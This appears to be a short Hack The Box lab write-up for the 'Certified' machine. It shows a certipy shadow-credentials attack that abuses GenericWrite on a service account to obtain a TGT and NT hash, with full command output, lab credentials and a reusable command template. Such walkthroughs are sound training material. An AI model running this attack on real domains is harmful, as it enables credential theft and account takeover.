The members of the group MANAGEMENT@CERTIFIED.HTB have generic write access to the user MANAGEMENT_SVC@CERTIFIED.HTB.

Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user

![[Pasted image 20241110204524.png]]



```bash
garffff@garffff:~/htb/certified$ certipy shadow auto -u judith.mader@certified.htb -p judith09 -account management_svc
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '92b4d02c-c7c2-c1ba-cd05-9cd1ca224681'
[*] Adding Key Credential with device ID '92b4d02c-c7c2-c1ba-cd05-9cd1ca224681' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID '92b4d02c-c7c2-c1ba-cd05-9cd1ca224681' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

### Summary

```bash
certipy shadow auto -u <username>@<domain> -p <password> -account <target_account>
```